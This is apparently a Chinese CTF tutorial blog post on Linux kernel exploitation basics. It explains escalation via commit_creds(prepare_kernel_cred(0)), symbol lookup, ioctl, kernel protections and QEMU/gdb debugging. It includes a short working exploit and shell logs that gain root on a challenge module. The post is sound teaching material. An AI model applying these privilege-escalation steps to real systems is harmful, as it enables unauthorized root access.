---
layout: post
title: "Start to Kernel Pwn"
date: 2020-02-07 00:33:19
categories: CTF
tags: kernel
---
对kernel方向的pwn的简单知识进行一些汇总和题目复现

1. qemu环境安装

```shell
sudo apt-get install qemu-user qemu-system
```

2. 目的

   与常规题目通过远程连接服务获得shell为目的不同，kernel题目通过远程登陆虚拟环境/本地一般使用qemu根据提供的启动脚本启动虚拟环境，利用内核模块(一般是题目给的*.ko文件)中的漏洞，在目标系统中运行编写的exploit程序，从而实现权限提升。

   //在exploit内部修改进程的权限，然后起shell即得到root权限的shell

3. 提权方式

   kernel中使用cred结构体存储进程的权限，最常用的提权的函数

   > int commit_creds(struct cred new)
   >
   > struct cred\* prepare_kernel_cred(struct task_struct* daemon)

   通过执行```commit_creds(prepare_kernel_cred(0))```,可以使当前进权限更改为root，他们地址可以通过/proc/kallsyms文件获取。

   ```shell
   jx@Dp  ~  sudo cat /proc/kallsyms | grep -E "commit_creds|prepare_kernel_cred"
   [sudo] jx 的密码：
   ffffffff98eaf9e0 T commit_creds
   ffffffff98eafd90 T prepare_kernel_cred
   ffffffff99fcb3d0 r __ksymtab_commit_creds
   ffffffff99fd4f20 r __ksymtab_prepare_kernel_cred
   ffffffff99ff06b7 r __kstrtab_prepare_kernel_cred
   ffffffff99ff06fe r __kstrtab_commit_creds
   ```
   - 原理：

     每个进程都有一个cred结构体，cred结构保存了进程的权限信息，而linux有一个更新进程资格(权限)的封装函数即```int commit_creds(struct cred *new)```，所以只要使用```struct cred *prepare_kernel_cred(struct task_struct *daemon)```创建一个合法的cred结构并作为参数传给commit_creds函数即可更新进程的权限。

     可能问题在于如何创建一个合法的代表root用户的task_struct结构，luckily~，在[cred.c](<https://code.woboq.org/linux/linux/kernel/cred.c.html>)中很好的解释了这个问题：

     >  @daemon is used to provide a base for the security record, but can be NULL.
     >
     > If @daemon is supplied, then the security data will be derived from that;
     >
     > otherwise they'll be set to 0 and no groups, full capabilities and no keys.

     如果daemon为空，则创建的cred结构中的security data会被置0，即代表root。

   - 例-[fductf2019-ZZJ的操作系统](<https://github.com/JX-Zhang98/myPwn/tree/master/fductf2019-ZZJkernel>)

     baby模块中只重新定义了write函数，并且```baby_write```函数中很明显有一个栅栏密码，step=11，加密结果为"z_lnok_sh__zodgriw_eitjf"，写入正确的明文“zzj_is_king_of_the_world”后就能执行

     ```c
     if ( (!v14 && !v15) == v14 )
       {
         v19 = prepare_kernel_cred(0LL, v18);
         commit_creds(v19);
       }
     ```

     从而获得root权限。

     这里要调用baby模块的write函数有两种方式：

     A. 在shell中直接往对应的模块文件中写入数据：

     ```bash
     Welcome to ZZJ's tiny system! But you're not root. Enjoy :)
     ~ $ id
     uid=1000(pwn) gid=1000 groups=1000
     ~ $ echo zzj_is_king_of_the_world > /dev/baby
     [   29.550750] Encrypted data: z_lnok_sh__zodgriw_eitjf
     /home/pwn # id
     uid=0(root) gid=0
     /home/pwn # cat /flag
     fductf{What_A_E45y_K3rn31_T45k_xD}
     ```

     在shell中使用echo向文件中写入数据，触发baby_write函数并通过校验，在```baby_write```函数中运行到```commit_creds(prepare_kernel_cred(0))```，从而将shell的权限更改位root。

     ~~(当然，这道题目因为没有在压缩包中替换成假flag，所以不进行hack而是直接解包也能拿到flag)~~

     B. 编写exploit程序，通过程序调用write函数触发

     对于这种比较单纯的题目A方法可以直接调用函数触发，但是对于其他略微复杂的题目需要进行更多复杂的操作进行配合来准备攻击环境和数据，所以编写程序，通过函数调用更为高效。

     ```c
     // gcc exploit.c -static -masm=intel -g -o exploit
     #include <string.h>
     #include <stdio.h>
     #include <stdlib.h>
     #include <unistd.h>
     #include <fcntl.h>
     #include <sys/stat.h>
     #include <sys/types.h>
     #include <sys/ioctl.h>
     int main()
     {
         int fd = open("/dev/baby", 2);
         if(fd < 0)
     	{
     		puts("[*]open /dev/baby error!");
     		exit(0);
     	}
         write(fd, "zzj_is_king_of_the_world", 25);
     	system("/bin/sh");
     }
     ```

     这里调用write函数，fd为使用open打开/dev/baby文件的文件描述符，即可向该文件中写入数据，触发```baby_write```函数，实现提权。运行结果：

     ```bash
     Welcome to ZZJ's tiny system! But you're not root. Enjoy :)
     ~ $ id
     uid=1000(pwn) gid=1000 groups=1000
     ~ $ /exploit 
     [*]status has been saved.
     [   10.565129] Encrypted data: z_lnok_sh__zodgriw_eitjf
     /home/pwn # id
     uid=0(root) gid=0
     /home/pwn # ~ $ [   23.143759] reboot: Power down
     ```

     这里有几点需要说明一下：

     - 首先是上传exploit文件到服务器的问题。对于这道题因为预期解不需要编写exploit程序，所以将程序传到远程有点麻烦，我这里只在本地对cpio文件重新打包，把exploit程序加进去。一般来说可以通过scp、base64等方式将程序上传。

     - 然后是以上两种方式建立root shell区别的问题。这里没有涉及到用户/内核状态切换，直接将数据写进去就能在**当前进程**获得root权限。在方式A中，在shell环境下直接echo进去，因为shell本身也是一个进程，所以获得root权限的是shell本身，echo之后直接就是root shell；在方式B中，是在exploit进程中使用write函数触发提权后门，**获得root权限的是exploit进程**，如果在write函数结束后直接退出，那么获得root权限的进程也退出了，原本的shell权限不会有改变，因为一般情况下，子进程会继承父进程的权限，而子进程不会影响父进程的权限。所以在exploit程序中，使用wirte函数触发提权后门之后再使用```system("/bin/sh")```建立一个新的shell，新shell作为exploit的子进程会继承root权限。在上方运行结果的最后一行也可以看到退出时使用了两个```ctrl+D```，先退出了exploit子进程的sh，也就是具有root权限的shell，第二次才是退出的原本的shell。

     - 最后是调用库函数write，怎么和baby_write函数牵扯上关系的问题。这个问题也是我最开始很久都不能理解的问题。现在也只是有一个初步的猜测，而不确定是否正确。思路来源于最近读到的一片论文:[Where Does It Go?: Refining Indirect-Call Targets with Multi-Layer Type Analysis](<https://www.cc.gatech.edu/~hhu86/papers/typedive.pdf>)，是讲内核中*indirect call*识别的问题。我们都知道write函数的真正实现在glibc中，我目前的想法是，```glibc.write```函数本身并未实现write函数的真正内容，而是只是一个封装。在内核层面，libc中通过系统调用进入内核，而write函数在内核中的调用就是论文中所讲的一种*indirect call*，会根据fd去调用不同的真正实现。

       ！然后目前还疑惑的一点是，LKM模块重定义write函数的```baby_write```函数是如何“识别”出来是“write”函数的？单纯靠函数名似乎有点儿戏，而且几个题目中对于这种重定义系统调用函数的命名方式并不统一，所以这点还没有想清楚。

4. ioctl

   [ioctl](<https://zh.wikipedia.org/wiki/Ioctl>)是一个系统调用，一个直接对指定设备进行访问和控制的接口。

   ```shell
   jx@Dp  ~  cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep ioctl
   #define __NR_ioctl 16
   ```

   现代操作系统的分层结构中，内核层(ring 0)可以随意使用外层的资源，但用户层(ring 3)程序则不允许直接访问内核资源，为此，操作系统为用户层对内核资源和服务的请求访问提供了接口，即系统调用。通过系统调用完成状态切换、函数调用等功能，在内核和用户空间之间实现“*我可以把内核资源借给你做我允许你做的事，但是不能把资源直接给你为所欲为*”的理想状态。

   ![1B7zSx.png](https://s2.ax1x.com/2020/02/04/1B7zSx.png){:width="100%"}

   大多数的硬件设备或内核模块可以通过系统调用完成功能需求，但是对于非标准硬件设备(如题目自定义的LKM)，可能现有的系统调用无法满足需求，需要直接访问设备进行控制，但操作系统不允许用户空间程序直接随意访问内核资源。ioctl就是为此而设计，通过ioctl用户空间可以直接与设备驱动进行沟通，但仍然满足“*我允许你做ioctl中允许你做的事*”的原则。

   ```int ioctl(int fd, unsigned long request, ...)```参数分别是：打开设备的文件描述符、与设备有关的请求码，后续是可变参数，与设备有关。如在强网杯2018-core题目中的ioctl函数：

   ```c
   __int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
   {
     switch ( a2 )
     {
       case 0x6677889B:
         core_read(a3);
         break;
       case 0x6677889C:
         printk("\x016core: %d\n");
         off = a3;
         break;
       case 0x6677889A:
         printk("\x016core: called core_copy\n");
         core_copy_func(a3);
         break;
     }
     return 0LL;
   }
   ```

   通过调用ioctl时指定的不同的请求码，可以分别调用```core_read()```函数和```core_copy_func()```函数，或对off变量进行赋值。

5. 保护措施

   LKM本身的保护措施与用户态程序相同。

   ```bash
   jx@Dp  ~/Desktop/kernel/qwb2018-core  checksec core.ko 
   [*] '/home/jx/Desktop/kernel/qwb2018-core/core.ko'
       Arch:     amd64-64-little
       RELRO:    No RELRO
       Stack:    Canary found
       NX:       NX enabled
       PIE:      No PIE (0x0)
   
   ```

   同时内核本身会根据qemu启动脚本中的参数设置保护措施

   - kaslr：系统本身的地址随机化，每次boot，各模块的加载基址随机
   - mmap_min_addr：This makes exploiting NULL pointer dereferences harder。使程序不能申请低内存从而更改内核数据写入恶意代码，通常是提升空指针间接引用的利用难度(并不消除漏洞，只是提高利用难度)
   - kallsyms：```/proc/kallsyms```文件中包含内核中所有符号的数据，如```commit_creds()```、```prepare_kernel_cred()```等，开启保护后，该文件仅root可读。
   - smep：Supervisor Mode Execution Protection，处理器处于kernel mode时执行用户空间的代码发生page fault
   - smap：Supervisor Mode Access Protection，处理器处于kernel mode时访问用户空间的数据发生page fault

   这里可以看看[hackluCTF2018-babykernel](<https://github.com/JX-Zhang98/myPwn/tree/master/hackluCTF_babyKernel>)

   题目形式很奇特，进去不是shell而是一个菜单，主要功能可以调用一个单参数内核函数或读一个文件。

   根据run.sh脚本，没有开启任何保护如kaslr等，所以内核的符号的地址可以直接通过vmlinux文件获得，而且地址为定值。*(如果开启了kaslr保护，通过vmlinux文件读取的符号地址与实际的加载地址存在随机偏移)*

   ```python
   kernel = ELF('./vmlinux')
   # get the address of 2 functions from vmlinux
   cred = kernel.sym['prepare_kernel_cred']
   commit = kernel.sym['commit_creds']
   ```

   然后根据菜单提示，提权之后读flag文件即可。

6. 状态切换&内核态函数

   [M4x](<http://m4x.fun/post/linux-kernel-pwn-abc-1/#%E7%8A%B6%E6%80%81%E5%88%87%E6%8D%A2>)大哥这里都说过了，目前本人了解不多也没有什么补充的。

7. 调试

   ```bash
   jx@Dp  ~  qemu-system-x86_64 --version | grep version;qemu-system-x86_64 --help | grep gdb
   QEMU emulator version 2.12.0 (Debian 1:2.12+dfsg-1+b1)
   -gdb dev        wait for gdb connection on 'dev'
   -s              shorthand for -gdb tcp::1234
   ```

   1. 通过在qemu启动参数中添加```-gdb tcp::[port]```参数，可以开启调试端口，将调试信息发送到127.0.0.1:[port]，或者```-s```可以直接代替```-gdb tcp::1234```。启动后在gdb中使用```target remote localhost:1234```即可实现远程调试。	

      */\*不同版本中参数有所差异，新版本中逐渐使用```-s```替代```-g 1234```。\*/

   2. 调试需要kernel中符号的地址，需要root权限读取，所以为了便于调试，修改init，使登陆用户位root

      ```bash
      # setsid /bin/cttyhack setuidgid 1000 /bin/sh
      setsid /bin/cttyhack setuidgid 0 /bin/sh
      ```

      使用```./gen_cpio.sh ../core.cpio```重新打包cpio文件。

   3. qemu与gdb联动调试

      qemu内：启动kernel，```./start.sh```

      qemu外：gdb远程调试

      ```
      jx@Dp  ~/Desktop/kernel/qwb2018-core/give2player  gdb ./vmlinux -q
      pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.
      pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
      Reading symbols from ./vmlinux...(no debugging symbols found)...done.
      pwndbg> # I use -gdb tcp::4321 instead of -s ^CQuit
      pwndbg> target remote localhost:4321
      Remote debugging using localhost:4321
      0xffffffff9426e7d2 in ?? ()
      ERROR: Could not find ELF base!
      ERROR: Could not find ELF base!
      ERROR: Could not find ELF base!
      ERROR: Could not find ELF base!
      LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
      ──────────────────────────────[ REGISTERS ]──────────────────────────────
       RAX  0xffffffff9426e7d0L ◂— sti    
       RBX  0xffffffff94c10480L ◂— 0x80000000
       ... ↓
       RSP  0xffffffff94c03eb8L —▸ 0xffffffff93ab65a0L ◂— jmp    0xffffffff93ab6541
       RIP  0xffffffff9426e7d2L ◂— ret    
      ───────────────────────────────[ DISASM ]────────────────────────────────
       ► 0xffffffff9426e7d2    ret    <0xffffffff93ab65a0L>
          ↓
         0xffffffff93ab65a0    jmp    0xffffffff93ab6541
          ↓
         0xffffffff93ab6541    or     byte ptr ds:[r12 + 2], 0x20
         ... ↓
         0xffffffff93ab655d    mov    rax, qword ptr [rbx]
         0xffffffff93ab6560    test   al, 8
      ────────────────────────────────[ STACK ]────────────────────────────────
      00:0000│ rsp  0xffffffff94c03eb8L —▸ 0xffffffff93ab65a0L ◂— jmp    0xffffffff93ab6541
      ... ↓
      07:0038│      0xffffffff94c03ef0L —▸ 0xffffffff93ab673aL ◂— jmp    0xffffffff93ab6735
      ──────────────────────────────[ BACKTRACE ]──────────────────────────────
       ► f 0 ffffffff9426e7d2
        ... ↓
         f 6                0
      ─────────────────────────────────────────────────────────────────────────
      pwndbg> c
      //要在gdb中继续运行，否则qemu中会卡住，无法进行后续操作
      ```

      此时gdb中只加载了kernel的符号，LKM的符号尚未加载。使用```add-symbol-file core.ko [textaddr]```添加，textaddr的值从```/sys/module/core/sections/.text```获取。

      ```
      //qemu内：
      / # cat /sys/module/core/sections/.text
      0xffffffffc01f9000
      
      //qemu外，gdb中：
      pwndbg> add-symbol-file ../core.ko 0xffffffffc01f9000
      add symbol table from file "../core.ko" at
      	.text_addr = 0xffffffffc01f9000
      Reading symbols from ../core.ko...(no debugging symbols found)...done.
      pwndbg> b * core_read
      Breakpoint 1 at 0xffffffffc01f9063
      pwndbg> b * 0xffffffffc01f9000+0xbeef^CQuit
      pwndbg> c
      Continuing.
      
      ```

      接下来就可以直接使用core.ko中的符号添加断点或者直接使用基址+offset添加断点了，其余调试分析步骤与用户态差别不大。

8. summary

   本章中对kernel pwn所需的一些基本前置知识以及其原理进行了更详细一些的汇总和演示，出现的两个题目也非常”baby“，下一篇中将对更正规一些的kernel题目进行复现。

**References: **

[Linux Kernel Exploitation](https://github.com/bash-c/slides/blob/master/pwn_kernel/13_lecture.pdf)

[M4x-Linux Kernel Pwn ABC](<http://m4x.fun/post/linux-kernel-pwn-abc-1/>)

